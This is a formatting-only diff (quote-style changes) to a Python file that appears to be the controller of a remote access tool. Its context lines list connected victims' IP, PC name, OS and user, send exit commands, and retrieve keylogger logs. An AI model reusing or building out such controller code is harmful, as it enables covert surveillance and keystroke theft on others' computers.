@@ -72,9 +72,9 @@ def _decode(data):
         return data.decode()
     except UnicodeDecodeError:
         try:
-            return data.decode('cp437')
+            return data.decode("cp437")
         except UnicodeDecodeError:
-            return data.decode(errors='replace')
+            return data.decode(errors="replace")
 
 
 def menu_help():
@@ -132,7 +132,7 @@ def close():
         return
 
     for _, conn in enumerate(arrConnections):
-        conn.send(b'exit')
+        conn.send(b"exit")
         conn.close()
     del arrConnections
     arrConnections = []
@@ -169,7 +169,7 @@ def list_connections():
     for index, text in enumerate(["IP", "Port", "PC Name", "OS", "User"]):
         strInfo += center(f"{arrAddresses[0][index]}", text) + 4 * " "
     strInfo += f"\n{strClients}"
-    print(strInfo, end='')
+    print(strInfo, end="")
 
 
 def select_connection(connection_id, blnGetResponse):
@@ -389,7 +389,7 @@ def keylogger(option):
         elif intBuffer == "error2":
             print("No logs.")
         else:
-            strLogs = recvall(int(intBuffer)).decode(errors='replace')  # get all data
+            strLogs = recvall(int(intBuffer)).decode(errors="replace")  # get all data
             print(f"\n{strLogs}")
 
 
